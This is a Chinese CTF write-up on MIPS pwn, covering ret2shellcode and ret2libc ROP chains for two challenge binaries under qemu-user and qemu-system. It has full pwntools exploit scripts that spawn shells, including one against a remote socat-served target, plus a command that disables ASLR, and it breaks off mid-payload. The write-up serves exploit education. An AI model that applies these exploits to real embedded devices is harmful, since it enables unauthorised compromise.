> 附件下载：链接: [https://pan.baidu.com/s/1e2Rrii_GNSNJv7bbV3BWcw](https://pan.baidu.com/s/1e2Rrii_GNSNJv7bbV3BWcw) 提取码: mh26
>
> 本文首发于IOTsec-Zone
>

+ 本篇文章尽量淡化对$s8和$fp这两个寄存器的区分。

# ret2shellcode
> 题目来源：2021HWS冬令营入营赛赛题–Mplogin
>

和x86 pwn相同，这里先检查可执行文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660608899328-649225f6-2c99-4380-acc2-6cac15cc3f31.png)

什么保护也没有开启，根据我之前做x86的pwn的经验，直接`ret2shellcode`。放到IDA中查看main的伪代码，如下图所示：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1658367497126-7d0534ac-e0c6-4d70-9ce3-c3af3ead3303.png)

进入`getUsername`函数，read没有溢出，并且Username要求输入**以“admin”****<font style="color:#E8323C;">为开头的字符串</font>**，否则会退出：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1658367609352-184ae48f-b8bd-4bb2-91c5-61a37bb07919.png)

该函数返回后会将`Username`的长度传入`checkPassword()`中：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1658368671793-f76e7574-36df-4c7a-92de-87cf1680ae35.png)

先来看第一个read函数，`read(0, v2, 36)`，v2变量的定义为`char v2[20]`，显而易见，该read可以造成栈溢出，可溢出的数据量为16字节。该函数的栈帧如下图所示：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1658368854427-e4ce1617-3561-43f5-bf64-9bbcc84d1f4e.png)

很明显，溢出之后就可以修改传入的`passwordLen`，这样第二个read：`read(0, v4, passwordLen)`就会出现任意长度的栈溢出。返回地址和Frame Pointer在该栈帧上的排布如下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1658369842535-d1b92bb3-ee5c-480f-a4ce-a20ddc48ace0.png)

因为`checkPassword`函数调用了其他的库函数，所以属于非叶子函数；即，在前面的文章中提到：“**<font style="color:#F5222D;">如果函数B是非叶子函数，则函数B先从堆栈中取出被保存在堆栈上的返回地址，然后将返回地址存入寄存器$ra，再使用</font>**`**<font style="color:#F5222D;">jr $ra</font>**`**<font style="color:#F5222D;">指令返回函数A</font>**”，所以我们只需要溢出修改上图的`return_addr`即可。在x86中，针对ret2shellcode这种攻击手段有两种方式：

1. 将shellcode写到**已知地址**并且具有可执行权限的内存区域中，然后劫持返回地址到该地址执行shellcode
2. 若栈地址未知，直接将shellcode写到返回地址的后面，将返回地址覆盖为gadget`pop eip`的地址，这样返回后就能执行shellcode 了。

首先排除第2种利用方法，因为MIPS指令集中并没有push和pop指令，所以我们只能使用第一种方法，在本题中要求我们需要泄露出栈地址。注意到`getUsername`有printf函数，我们只需要将v1填满（避免printf遇到\x00截断）就可以泄露出`栈底地址`与`return_addr`（非所在的栈地址）：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660611259439-96f16e5d-844f-4f64-adf9-bfa912d48d58.png)

```python
from pwn import *
import sys
context.arch = "mips"
context.endian = 'little'
context.log_level = 'debug'

try: 
  if(sys.argv[1] == "g"):
      p = process(["qemu-mipsel-static", "-g", "1234", "-L", "./", "./Mplogin"])
  elif(sys.argv[1] == "l"):
      p = process(["qemu-mipsel-static", "-L", "./", "./Mplogin"])
  else:
    raise(Exception)
except:
    print("<usage: python exp (your choice)>")
    exit(0)

p.recvuntil(b"Username : ")
p.send(b"admin".ljust(24, b"a"))
p.recvuntil((24-len(b"admin"))*b'a')
print(p.recv())
p.close()
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660811360234-c774ca67-67e5-4803-8bfc-917e1690bcef.png)

![返回地址为0x400B90](https://cdn.nlark.com/yuque/0/2022/png/574026/1660811315474-5e4be68d-8949-4082-a1f7-52f710e77a4d.png)

根据栈帧平衡，`getUsername`与`checkPassword`的返回地址与栈底地址所处的位置相同：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660613067232-8e0c6b76-ea01-42bd-b808-6d25756a33f7.png)

所以shellcode的地址为0x7FFFEFB0。exp如下：

```python
from pwn import *
import sys
context.arch = "mips"
context.endian = 'little'
context.log_level = 'debug'

try: 
  if(sys.argv[1] == "g"):
      p = process(["qemu-mipsel-static", "-g", "1234", "-L", "./", "./Mplogin"])
  elif(sys.argv[1] == "l"):
      p = process(["qemu-mipsel-static", "-L", "./", "./Mplogin"])
  else:
    raise(Exception)
except:
    print("<usage: python exp (your choice)>")
    exit(0)

p.recvuntil(b"Username : ")
p.send(b"admin".ljust(24, b"a"))
p.recvuntil((24-len(b"admin"))*b'a')
leak_addr = (u32(p.recv(4)))
log.info("leak addr is {}".format(hex(leak_addr)))

p.recvuntil(b"Pre_Password : ")
p.send(b'access'+b'a'*14+p32(0x100))
p.recvuntil("Password : ")
p.send(b"0123456789".ljust(40, b"b")+p32(leak_addr)+asm(shellcraft.sh()))		# 将返回地址更改为leak_addr
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660811475498-db13bea0-bf89-49c0-a36e-f58ca508ffde.png)

# ret2libc
## qemu-user
> 题目来源：2021第四届强网拟态防御积分赛工控pwn eserver
>

进行checksec检查，发现开启了PIE和RELRO保护：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660700287112-930cf1c0-779a-4d7a-beb6-1101421fae9a.png)

我们都知道，地址随机化只是保持低12位不变，高位还是会随机变的；但是这里需要注意的是，**<font style="color:#E8323C;">在强网比赛的时候环境是使用</font>**`**<font style="color:#E8323C;">qemu-user</font>**`**<font style="color:#E8323C;">模拟的，所以PIE保护是不会生效的，也就是说libc的地址固定不变。</font>**对`eserver`进行逆向分析，可以得到如下结论：

1.  main函数存在栈溢出。
2. main函数存在后门函数`backdoor`。
3. `backdoor`函数只能调用一次。

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660789601866-f546e6db-4255-40f5-9c23-ac4730c3235b.png)

其中`后门函数backdoor`可以**<font style="color:#E8323C;">泄露出read函数的后3字节地址（低18位）中的任意一个字节</font>**：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660700538616-220f616e-0816-45c6-b077-29cb8b0a848f.png)

因为该程序由`qemu-user`模拟，所以无论你重启多少次程序，read函数的地址永远不变。即，我们要启动3次程序以泄露出read函数的后三位真实地址，这一部分的代码如下：

```python
from pwn import *
context.arch = "mips"
context.endian = 'little'
# context.log_level = 'debug'

readOffset_True = 0
libc = ELF("./lib/libc.so.6")
for i in range(3):
    p = process(["qemu-mipsel-static", "-L", ".", "./eserver"])
    p.sendlineafter("Input package: ","Administrator")
    log.info(p.recv())
    sleep(0.1)
    p.sendlineafter("Input package: ",str(i))
    p.recvuntil("Response package: ")
    leak_byte = u8(p.recv(1))
    print(leak_byte)
    readOffset_True += (leak_byte << (8*i))
    p.close()
print(hex(readOffset_True))
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660784041998-89c6f215-6b5f-4ae9-9d71-b0fae25ad322.png)

对照一下本题的libc：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660784319404-0b08fe37-48d4-4f81-ab28-602bc0a903b0.png)

现在我们知道了两个地址：

+ 程序运行时read函数的真实地址的后3字节：0x6FBEA4。
+ read函数在文件中的偏移为0xDDEA4

但是根据这些我们仍然无法完全得知libc代码段的基地址，只能得到后三位为`0x6FBEA4 - 0xDDEA4 == 0x61e000`。**<font style="color:#E8323C;">正好，使用</font>**`**<font style="color:#E8323C;">qemu-user</font>**`**<font style="color:#E8323C;">模拟的程序其动态链接库都会加载到</font>**`**<font style="color:#E8323C;">0x7f000000</font>**`**<font style="color:#E8323C;">到</font>**`**<font style="color:#E8323C;">0x80000000</font>**`**<font style="color:#E8323C;">范围之内，那这不就简单了，read函数的完整地址应为</font>**`**<font style="color:#E8323C;">0x7f000000 + 0x61e000 == 0x7f61e000</font>**`**<font style="color:#E8323C;">。</font>**

下面开始利用，程序没有开启`NX保护`，我们还是可以`ret2shellcode`；但是我们无法像之前得知栈地址，因此需要走一些弯路找gadgets。这里就使用IDA的`mipsrop`插件好了

> + `mipsrop`插件：[https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py](https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py)
>

下载完成之后放到`IDA`的plugins目录，用IDA打开题目自带的`libc.so.6`，点击`search`->`mips rop gadgets`，然后在最下面的python代码框中键入`mipsrop.find(<要寻找的gadget>)`以寻找相应的gadgets。我们直接来看看exp是怎么写的，首先计算出libc代码段的基地址以及其他所需gadgets的真实地址：

```python
print(hex(readOffset_True))
readOffset_Libc = libc.symbols['read']
libcCodeBase = readOffset_True - readOffset_Libc 
FullLibcCodeBase = 0x7f000000 + libcCodeBase
log.success(hex(FullLibcCodeBase))

# 所有的地址都不会变化
p = process(["qemu-mipsel-static", "-L", "./", "./eserver"])

lw_s3_gadget = 0x0A0C7C + FullLibcCodeBase
jalr_t9_gadget = 0x11C68C + FullLibcCodeBase
addiu_a1_sp_24_gadget = 0xF60D4 + FullLibcCodeBase
```

我们跟着gadgets了解下getshell的流程，溢出后栈布局为：

```python
shellcode = asm(shellcraft.sh())
padding = b"TruE"

payload = b'a'*504							# overflow
payload += b'b'*4							# $fp								 
payload += p32(lw_s3_gadget) 				# $ra  
payload += b'c'*44
payload += padding                        	# s0
payload += padding                        	# s1
payload += padding                        	# s2
payload += p32(jalr_t9_gadget)            	# s3
payload += p32(addiu_a1_sp_24_gadget)     	# ra  
payload += b'd'*24
payload += shellcode
```

首先执行`lw_s3_gadget`，根据栈与gadget，有：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660794061177-0519678a-3bf8-41bf-bed1-76f0416dad12.png)

```python
'''
lw_s3_gadget:
# .text:000A0C7C                 lw      $ra, 0x2C+var_s10($sp)【$ra == &addiu_a1_sp_24_gadget】
# .text:000A0C80                 lw      $s3, 0x2C+var_sC($sp) 【$s3 == &jalr_t9_gadget】
# .text:000A0C84                 lw      $s2, 0x2C+var_s8($sp) 【$s2 == "TruE"】
# .text:000A0C88                 lw      $s1, 0x2C+var_s4($sp) 【$s1 == "TruE"】
# .text:000A0C8C                 lw      $s0, 0x2C+var_s0($sp) 【$s0 == "TruE"】
# .text:000A0C90                 jr      $ra				   【调用addiu_a1_sp_24_gadget】
''' 
```

跳转到`addiu_a1_sp_24_gadget`执行：

```python
'''
addiu_a1_sp_24_gadget
# .text:000F60D4                 addiu   $a1, $sp, 24			【$a1 = $sp + 24】
# .text:000F60D8                 move    $t9, $s3				【$t9 == &jalr_t9_gadget】
# .text:000F60DC                 jalr    $t9					【调用jalr_t9_gadget】
''' 
```

最后到`jalr_t9_gadget`：

```python
'''
jalr_t9_gadget
# .text:0011C68C                 move    $t9, $a1				【$t9 == $a1 == $sp + 24】
# .text:0011C690                 move    $a1, $a0				【$a1 == $a0 == 未知】
# .text:0011C694                 jalr    $t9					【???】
'''
```

不是，这后半部分的调用我怎么没有看懂呢？最后的`jalr`到底调用了什么呢？正常来说经过第二个gadget后`$a1`应该指向的是shellcode的地址，但是根据上面的汇编，`$a1`怎么可能指向shellcode，他又没有改变$sp寄存器？到这里暂停一下，先来看一个之前文章中出现的例子：

```c
// mipsel-linux-gnu-gcc -g -fno-stack-protector -z execstack -no-pie -z norelro leaf_function.c -o leaf_function_MIPSEL_32
#include <stdio.h>

char* child1_func1(char* buffer){
    return buffer;
}

void parent_func(){
    char *name = "cyberangel";
    printf("I'm parent function\n");
    printf("%s",child1_func1(name));

}
int main(){
    parent_func();
    return 0;
}
```

下面是`parent_func`函数的汇编代码，可以看到每一条调用函数的jalr（jal）之后都紧跟着一个nop指令：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660816030695-279c66b3-00c8-4b4a-b27a-7cd7f3332747.png)

但是你真的在意过这些nop指令的作用吗？我们可以将任意一个函数后面的nop改为其他不影响程序执行流程的指令，这里就改`jal child1_func1`的nop吧，改为`move $a1, $a0`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660823033203-58bc0f63-2f08-4a86-9c6d-1e6ecdbc0757.png)

将此可执行文件导出，使用IDA调试：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660823485467-b5040034-daa3-4174-9f1b-b6e6108c232f.png)

现在`$a0`与`$a1`的寄存器值分别为`0x004009F0`与`0xFFFFFFFF`，按下F7单步步入：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660823591545-8fbed2b9-c625-4fa9-a25d-3277c20be774.png)

现在`$a1`的值同样变化为`0x4009F0`，说明程序在执行`child1_func`函数的第一条指令之前提前执行了`move $a1, $a0`，这也就是为什么每条调用函数的汇编指令之后紧跟着一个nop而非其他指令 -- 不进行任何操作；出现这种情况的原因似乎与MIPS架构的流水线特性有关...函数返回后retn到`&jal+8`处继续执行。

其实前面所展示的gadgets是省略的，都缺少了调用指令之后的那条指令，回过头来看我们的gadgets，首先是：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660824087994-9035cba2-9d57-4e07-bf63-0acbd001785c.png)

哎，这就对味了嘛（下面的代码框以`$sp`为基准）：

```python
# 执行前
payload += b'c'*44
payload += padding                        	# s0（4字节，下同）
payload += padding                        	# s1
payload += padding                        	# s2
payload += p32(jalr_t9_gadget)            	# s3
payload += p32(addiu_a1_sp_24_gadget)     	# ra  
payload += b'd'*24
payload += shellcode

# 执行后
payload += b'd'*24
payload += shellcode
```

```python
'''
lw_s3_gadget:
# .text:000A0C7C                 lw      $ra, 0x2C+var_s10($sp)【$ra == &addiu_a1_sp_24_gadget】
# .text:000A0C80                 lw      $s3, 0x2C+var_sC($sp) 【$s3 == &jalr_t9_gadget】
# .text:000A0C84                 lw      $s2, 0x2C+var_s8($sp) 【$s2 == "TruE"】
# .text:000A0C88                 lw      $s1, 0x2C+var_s4($sp) 【$s1 == "TruE"】
# .text:000A0C8C                 lw      $s0, 0x2C+var_s0($sp) 【$s0 == "TruE"】
# .text:000A0C90                 jr      $ra				   【调用addiu_a1_sp_24_gadget】
# .text:000A0C94                 addiu   $sp, 0x40				
''' 
```

执行`addiu_a1_sp_24_gadget`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660824539265-5fc528f2-2731-449d-ae0b-d62ec0a2ba65.png)

```python
'''
addiu_a1_sp_24_gadget
# .text:000F60D4                 addiu   $a1, $sp, 24			【$a1 = $sp + 24 = &shellcode】
# .text:000F60D8                 move    $t9, $s3				【$t9 == &jalr_t9_gadget】
# .text:000F60DC                 jalr    $t9					【调用jalr_t9_gadget】
# .text:000F60E0                 li      $a0, 0x1D				
''' 
```

执行后$a1指向shellcode的起始地址，最后执行`jalr_t9_gadget`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660824729318-c3c0d376-987d-4435-bcce-c478434167e1.png)

```python
'''
jalr_t9_gadget
# .text:0011C68C                 move    $t9, $a1				【$t9 == &shellcode】
# .text:0011C690                 move    $a1, $a0				【$a1 == $a0 == 0x1D】
# .text:0011C694                 jalr    $t9					【执行shellcode】
# .text:0011C698                 move    $a0, $v1				【$v1的值未知，无伤大雅】
'''
```

最后需要让程序退出以触发payload，完整exp如下：

```python
from pwn import *
context.arch = "mips"
context.endian = 'little'
# context.log_level = 'debug'

readOffset_True = 0
libc = ELF("./lib/libc.so.6")
for i in range(3):
    p = process(["qemu-mipsel-static", "-L", ".", "./eserver"])
    p.sendlineafter("Input package: ","Administrator")
    log.info(p.recv())
    sleep(0.1)
    p.sendlineafter("Input package: ",str(i))
    p.recvuntil("Response package: ")
    leak_byte = u8(p.recv(1))
    readOffset_True += (leak_byte << (8*i))
    p.close()
print(hex(readOffset_True))
readOffset_Libc = libc.symbols['read']
libcCodeBase = readOffset_True - readOffset_Libc 
FullLibcCodeBase = 0x7f000000 + libcCodeBase
log.success(hex(FullLibcCodeBase))
# -----------------------------------------------------------
p = process(["qemu-mipsel-static","-L", "./", "./eserver"])

lw_s3_gadget = 0x0A0C7C + FullLibcCodeBase
jalr_t9_gadget = 0x11C68C + FullLibcCodeBase
addiu_a1_sp_24_gadget = 0xF60D4 + FullLibcCodeBase

padding = b"TruE"
shellcode = asm(shellcraft.sh())
payload = b'a'*504							# overflow
payload += b'b'*4							# $fp								
'''
lw_s3_gadget:
# .text:000A0C7C                 lw      $ra, 0x2C+var_s10($sp)
# .text:000A0C80                 lw      $s3, 0x2C+var_sC($sp)
# .text:000A0C84                 lw      $s2, 0x2C+var_s8($sp)
# .text:000A0C88                 lw      $s1, 0x2C+var_s4($sp)
# .text:000A0C8C                 lw      $s0, 0x2C+var_s0($sp)
# .text:000A0C90                 jr      $ra
# .text:000A0C94                 addiu   $sp, 0x40
'''  
payload += p32(lw_s3_gadget) 				# $ra  
      
payload += b'c'*44
payload += padding                        	# s0
payload += padding                        	# s1
payload += padding                        	# s2
'''
jalr_t9_gadget
# .text:0011C68C                 move    $t9, $a1
# .text:0011C690                 move    $a1, $a0
# .text:0011C694                 jalr    $t9
# .text:0011C698                 move    $a0, $v1
'''
payload += p32(jalr_t9_gadget)            	# s3
'''
addiu_a1_sp_24_gadget
# .text:000F60D4                 addiu   $a1, $sp, 24
# .text:000F60D8                 move    $t9, $s3
# .text:000F60DC                 jalr    $t9
# .text:000F60E0                 li      $a0, 0x1D
''' 
payload += p32(addiu_a1_sp_24_gadget)     	# ra  
payload += b'd'*24
payload += shellcode

p.sendlineafter('Input package: ', payload)
p.sendlineafter('Input package: ', 'EXIT')
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660825333256-3e38bb3c-db62-432d-be4d-7836d588f740.png)

最后出现`ls: write error: Bad file descriptor`的错误，这是因为程序在最后关闭了标准输出：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660825387576-4447e934-e7d6-480b-bb27-cb775c211bfc.png)

我们只需要将流重定向到`stderr`就行：`ls 1>&2`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660825545050-685e9e05-f976-4760-940a-9b4ff2e7cd13.png)

另外，pwndbg的vmmap命令不支持qemu-user（无法查看内存布局），并且无法对函数直接下断点（b main），总之局限性非常大：

```bash
cyberangel@cyberangel:~/Desktop/MIPS_PWN/eserver$ qemu-mipsel-static -g 1234 -L . ./eserver
----------------------------------------------------------------------------------------------------------------
gdb-multiarch
$ set arch mips
$ set endian little
$ target remote localhost:1234
$ file ./eserver
$ b main  【Breakpoint 1 at 0xfe0】
$ c    		【直接跑飞，无法断下】
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660826396845-980cdfe9-481b-4e42-899d-dcf17ac93344.png)

要想能正常调试还得看我qemu-system。

## qemu-system
如果程序使用qemu-system模拟，抛开地址随机化不谈，上面的那个exp是**<font style="color:#E8323C;">有可能</font>**无法getshell的，下面我们来演示一下。由于qemu-system系统中并没有自带`socat`工具，但是我们可以退而求其次，使用静态的且已经编译好的可执行程序。

> socat下载地址：[https://github.com/hypn/misc-binaries/blob/master/socat-mipsel32-static-debian-squeeze](https://github.com/hypn/misc-binaries/blob/master/socat-mipsel32-static-debian-squeeze)（小端序）
>

为了防止受地址随机化的影响，这里我选择关闭（不关闭这道题目就做不成了）：`echo 0 > /proc/sys/kernel/randomize_va_space`。查看libc地址：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660868796532-c11aaabf-70a6-4be0-a4ba-1164cf18ae06.png)

将qemu-system的`/lib/ld-2.11.3.so`与`/lib/libc-2.11.3.so`拷贝出来，尝试寻找gadgets，首先是`lw_s3_gadget`，地址为0xA0730：

```bash
.text:000A0730                               loc_A0730:                               # CODE XREF: sub_A0658+78↑j
.text:000A0730 34 00 BF 8F                   lw      $ra, 0x24+var_s10($sp)						# 52
.text:000A0734 30 00 B3 8F                   lw      $s3, 0x24+var_sC($sp)						# 48
.text:000A0738 2C 00 B2 8F                   lw      $s2, 0x24+var_s8($sp)						# 44
.text:000A073C 28 00 B1 8F                   lw      $s1, 0x24+var_s4($sp)						# 40
.text:000A0740 24 00 B0 8F                   lw      $s0, 0x24+var_s0($sp)						# 36
.text:000A0744 08 00 E0 03                   jr      $ra
.text:000A0748 38 00 BD 27                   addiu   $sp, 0x38												# 56
```

然后是`jalr_t9_gadget`和`addiu_a1_sp_24_gadget`，该版本的libc中没有`jalr $t9`gadget，我们只能重新选择gadget和布置栈：

```bash
loc_126440:
.text:00126440 21 C8 A0 00                   move    $t9, $a1
.text:00126444 4C 00 84 24                   addiu   $a0, 0x4C  # 'L'
.text:00126448 08 00 20 03                   jr      $t9
.text:0012644C 21 28 C0 00                   move    $a1, $a2
--------------------------------------------------------------------------------------------------------------------------------
.text:00023828                               loc_23828:                               # CODE XREF: sub_23790+5C↑j
.text:00023828 21 C8 20 02                   move    $t9, $s1
.text:0002382C 09 F8 20 03                   jalr    $t9 
.text:00023830 1C 00 A5 27                   addiu   $a1, $sp, 0x24+var_8							# 0x1C(28)
```

栈的布置为：

```bash
# 执行前（溢出后）
payload = b'a'*504													# overflow
payload += b'b'*4														# $fp								 
payload += p32(lw_s3_gadget) 								# $ra  

payload += b'c'*36
payload += padding                        	# s0
payload += p32(loc_126440)				                # s1
payload += padding                        	# s2
payload += padding           								# s3
payload += p32(loc_23828)   											# ra  
payload += b'd'*28
payload += shellcode

loc_A0730:
.text:000A0730                               loc_A0730:                               # CODE XREF: sub_A0658+78↑j
.text:000A0730 34 00 BF 8F                   lw      $ra, 0x24+var_s10($sp)						# 52【$ra == &loc_23828】
.text:000A0734 30 00 B3 8F                   lw      $s3, 0x24+var_sC($sp)						# 48【$s3 == "TruE"】
.text:000A0738 2C 00 B2 8F                   lw      $s2, 0x24+var_s8($sp)						# 44【$s2 == "TruE"】
.text:000A073C 28 00 B1 8F                   lw      $s1, 0x24+var_s4($sp)						# 40【$s1 == &loc_11C370】
.text:000A0740 24 00 B0 8F                   lw      $s0, 0x24+var_s0($sp)						# 36【$s2 == "TruE"】
.text:000A0744 08 00 E0 03                   jr      $ra
.text:000A0748 38 00 BD 27                   addiu   $sp, 0x38												# 56

----------------------------------------------------------------------------------------------------------------
loc_23828:
.text:00023828                               loc_23828:                               # CODE XREF: sub_23790+5C↑j
.text:00023828 21 C8 20 02                   move    $t9, $s1													# 【$t9 ==  &loc_11C370】
.text:0002382C 09 F8 20 03                   jalr    $t9 
.text:00023830 1C 00 A5 27                   addiu   $a1, $sp, 0x24+var_8							# 0x1C(28):【$a1 == &shellcode】
----------------------------------------------------------------------------------------------------------------
loc_126440:
.text:00126440 21 C8 A0 00                   move    $t9, $a1
.text:00126444 4C 00 84 24                   addiu   $a0, 0x4C  # 'L'
.text:00126448 08 00 20 03                   jr      $t9
.text:0012644C 21 28 C0 00                   move    $a1, $a2
```

exp如下（注意挂载的是qemu system的libc和ld）：

```python
from pwn import *
context.arch = "mips"
context.endian = 'little'
context.os = "linux"
context.log_level = 'debug'

readOffset_True = 0
libc = ELF("./lib/libc.so.6")								# 挂载的是qemu system的libc和ld
for i in range(3):
    p = process(["qemu-mipsel-static", "-L", ".", "./eserver"])
    p.sendlineafter("Input package: ","Administrator")
    log.info(p.recv())
    sleep(0.5)
    p.sendlineafter("Input package: ",str(i))
    p.recvuntil("Response package: ")
    leak_byte = u8(p.recv(1))
    readOffset_True += (leak_byte << (8*i))
    p.close()
print(hex(readOffset_True))
readOffset_Libc = libc.symbols['read']
libcCodeBase = readOffset_True - readOffset_Libc 
FullLibcCodeBase = 0x7f000000 + libcCodeBase
log.success(hex(FullLibcCodeBase))
# -----------------------------------------------------------
p = process(["qemu-mipsel-static","-L", "./", "./eserver"])	# 挂载的是qemu system的libc和ld

lw_s3_gadget = 0xA0730 + FullLibcCodeBase
loc_126440 = 0x126440 + FullLibcCodeBase
loc_23828 = 0x23828 +FullLibcCodeBase

padding = b"TruE"
shellcode = asm(shellcraft.sh())
payload = b'a'*504											# overflow
payload += b'b'*4										    # $fp								 
payload += p32(lw_s3_gadget) 								# $ra  

payload += b'c'*36
payload += padding                        	                # s0
payload += p32(loc_126440)				                    # s1
payload += padding                        	                # s2
payload += padding           								# s3
payload += p32(loc_23828)   								# ra  
payload += b'd'*28
payload += shellcode

p.sendlineafter('Input package: ', payload)
p.sendlineafter('Input package: ', 'EXIT')
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660885061457-c5914ccd-39e6-491c-ac0c-940913695953.png)

拿到shell之后，在`qemu-system`中执行`./socat-mipsel32-static-debian-squeeze tcp-l:9999,fork exec:./eserver`，然后稍微修改一下脚本，我们尝试看能不能拿到shell：

```python
from pwn import *
context.arch = "mips"
context.endian = 'little'
context.os = "linux"
context.log_level = 'debug'

libc = ELF("./lib/libc.so.6")

#-----------------------------------------------------------
p = remote("192.168.2.2",9999)
FullLibcCodeBase = 0x77E41000
lw_s3_gadget = 0xA0730 + FullLibcCodeBase
loc_126440 = 0x126440 + FullLibcCodeBase
loc_23828 = 0x23828 +FullLibcCodeBase

padding = b"TruE"
shellcode = asm(shellcraft.sh())
payload = b'a'*504											# overflow
payload += b'b'*4										    # $fp								 
payload += p32(lw_s3_gadget) 								# $ra  

payload += b'c'*36
payload += padding                        	                # s0
payload += p32(loc_126440)				                    # s1
payload += padding                        	                # s2
payload += padding           								# s3
payload += p32(loc_23828)   								# ra  
payload += b'd'*28
payload += shellcode

p.sendlineafter('Input package: ', payload)
p.sendlineafter('Input package: ', 'EXIT')
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660887562266-f49c4b3a-4fad-4a9b-bdf4-08082986e039.png)

此时查看进程的fd：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660887757753-16fee9ec-42e8-4445-a939-d71ae3a3b4a9.png)

所以执行`ls 1>&0`就能回显：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660887846177-9353ea01-e5e7-4216-863d-107e6aefea86.png)

但其实到这里都不是我要说明的，在qemu-system模式中拿到shell我也没想到，可能`qemu-user`和`qemu-system`都没有将MIPS架构的流水线特性体现出来吧：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1660888008974-7c689eda-6fe2-468a-99b8-93403883b0fc.png)

现在我们向将payload中插入sleep函数：

![qemu的libc](https://cdn.nlark.com/yuque/0/2022/png/574026/1660888453268-fe4b4289-d1cf-44d4-b169-c3e6e2a3c6c4.png)重新尝试寻找gadgets并重新布置栈，我们有：

```bash
.text:000A0730                               loc_A0730:                               # CODE XREF: sub_A0658+78↑j
.text:000A0730 34 00 BF 8F                   lw      $ra, 0x24+var_s10($sp)						# 52【$ra == &loc_13A354】
.text:000A0734 30 00 B3 8F                   lw      $s3, 0x24+var_sC($sp)						# 48【$s3 == &loc_92838】
.text:000A0738 2C 00 B2 8F                   lw      $s2, 0x24+var_s8($sp)						# 44【$s2 == "TruE"】
.text:000A073C 28 00 B1 8F                   lw      $s1, 0x24+var_s4($sp)						# 40【$s1 == "TruE"】
.text:000A0740 24 00 B0 8F                   lw      $s0, 0x24+var_s0($sp)						# 36【$s0 == &sleep函数真实地址】
.text:000A0744 08 00 E0 03                   jr      $ra
.text:000A0748 38 00 BD 27                   addiu   $sp, 0x38												# 56
--------------------------------------------------------------------------------------------------------------------------------
loc_13A354:
.text:0013A354 01 00 04 24                   li      $a0, 1														# 【$a0 == 1】
.text:0013A358 21 C8 60 02                   move    $t9, $s3													# 【$t9 == loc_92838】
.text:0013A35C 09 F8 20 03                   jalr    $t9 ; socket											# 【调用loc_92838】
.text:0013A360 21 30 00 00                   move    $a2, $zero
--------------------------------------------------------------------------------------------------------------------------------
loc_92838:
.text:00092838 21 C8 00 02                   move    $t9, $s0													#	【$s0 == &sleep函数真实地址】
.text:0009283C 09 F8 20 03                   jalr    $t9 ; uselocale									#	【调用sleep】
.text:00092840 21 90 40 00                   move    $s2, $v0
.text:00092840																																				# 这里可以重新布置栈
.text:00092844 24 00 BF 8F                   lw      $ra, 0x18+var_sC($sp)						# 36				
.text:00092848 21 10 40 02                   move    $v0, $s2
.text:0009284C 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)						# 32
.text:00092850 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)						# 28
.text:00092854 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)						# 24
.text:00092858 08 00 E0 03                   jr      $ra
.text:0009285C 28 00 BD 27                   addiu   $sp, 0x28												# 40
--------------------------------------------------------------------------------------------------------------------------------
loc_23828:
.text:00023828                               loc_23828:                               # CODE XREF: sub_23790+5C↑j
.text:00023828 21 C8 20 02                   move    $t9, $s1
.text:0002382C 09 F8 20 03                   jalr    $t9 
.text:00023830 1C 00 A5 27                   addiu   $a1, $sp, 0x24+var_8							# 0x1C(28)【$a1 == &shellcode】
--------------------------------------------------------------------------------------------------------------------------------
loc_126440:
.text:00126440 21 C8 A0 00                   move    $t9, $a1													#【$t9 == &shellcode】
.text:00126444 4C 00 84 24                   addiu   $a0, 0x4C  # 'L'
.text:00126448 08 00 20 03                   jr      $t9															#【执行shellcode】
.text:0012644C 21 28 C0 00                   move    $a1, $a2
--------------------------------------------------------------------------------------------------------------------------------
```

```python
loc_A0730 = FullLibcCodeBase + 0xA0730
loc_92838 = FullLibcCodeBase + 0x92838
loc_13A354 = FullLibcCodeBase + 0x13A354
loc_126440 = FullLibcCodeBase + 0x126440
loc_23828 = FullLibcCodeBase + 0x23828
sleep_TruE = FullLibcCodeBase + 0xB2BB0

padding = b"TruE"
shellcode = asm(shellcraft.sh())
payload = b'a'*504											# overflow
payload += b'b'*4										    # $fp								 
payload += p32(loc_A0730)    # $ra  
#----------------------------------------
payload += b'c'*36
payload += p32(sleep_TruE)   # $s0
payload += padding           # $s1
payload += padding           # $s2            
payload += p32(loc_92838)    # $s3
payload += p32(loc_13A354)   # ra  
#----------------------------------------
payload += b'd'*24
payload += padding           # $s0
payload += p32(loc_126440)   # $s1
